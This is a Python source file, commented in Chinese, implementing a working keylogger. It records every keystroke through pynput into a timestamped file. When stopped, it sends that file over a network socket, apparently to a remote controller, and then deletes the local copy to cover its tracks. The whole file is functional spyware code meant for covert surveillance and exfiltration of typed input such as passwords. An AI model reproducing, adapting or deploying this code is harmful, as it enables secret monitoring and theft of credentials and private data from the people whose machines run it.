import pynput.keyboard
import datetime
import subprocess
import struct
import os

log = ""
file_path = ""
listener = None


def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

    # 添加时间戳
    with open(file_path, "a") as f:
        # timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        # f.write(f"[{timestamp}] {log}\n")
        f.write(log)
        log = ""


def start_keylogger():
    global file_path, listener
    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    file_path = f"keylog_{timestamp}.txt"
    with open(file_path, "w") as f:
        f.write("Keylogger started\n")

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()


def stop_keylogger(client_socket):
    global listener
    if listener:
        listener.stop()
        listener = None

    # 获取文件路径
    latest_file = max([f for f in os.listdir('.') if f.startswith("keylog_")], key=os.path.getctime)
    send_file(latest_file, client_socket)
    return "Keylogger stopped\n"


def send_file(filename, client_socket):
    """
    通过网络将文件发送到指定的客户端套接字。

    参数：
        filename (str): 要发送的文件名。
        client_socket (socket.socket): 用于通信的套接字对象。
    """
    # 获取文件大小
    file_size = os.path.getsize(filename)

    # 填充文件名到128字节
    filename_padded = bytes(os.path.basename(filename).encode('utf-8')).ljust(128, b'\x00')

    # 打包文件信息
    fileinfo = struct.pack("128sl", filename_padded, file_size)
    client_socket.send(fileinfo)

    # 分块发送文件
    with open(filename, "rb") as file:
        while True:
            data = file.read(1024)  # 每次读取1024字节
            if not data:
                break
            client_socket.sendall(data)

    client_socket.send(b"END")
    print(f"{filename} 已成功发送")

    # 删除文件
    os.remove(filename)